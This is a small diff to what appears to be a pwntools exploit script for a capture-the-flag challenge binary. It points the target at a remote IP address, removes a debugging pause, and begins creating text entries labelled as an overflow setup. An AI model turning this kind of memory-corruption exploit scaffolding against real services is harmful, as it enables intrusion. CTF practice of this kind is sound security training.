@@ -131,12 +131,11 @@ def delete_text(index):
 gdbscript = """
 c
 """
-host, port = args.HOST or "localhost", args.PORT or 16000
+host, port = args.HOST or "108.137.70.166", args.PORT or 16000
 exe = context.binary = ELF(args.EXE or "../src/chall", False)
 
 io = start()
 
-pause()
 create_text(1, 17, 1, b"overflow me\n")
 create_text(2, 17, 1, b"size\n")
 create_text(3, 17, 1, b"printer\n")
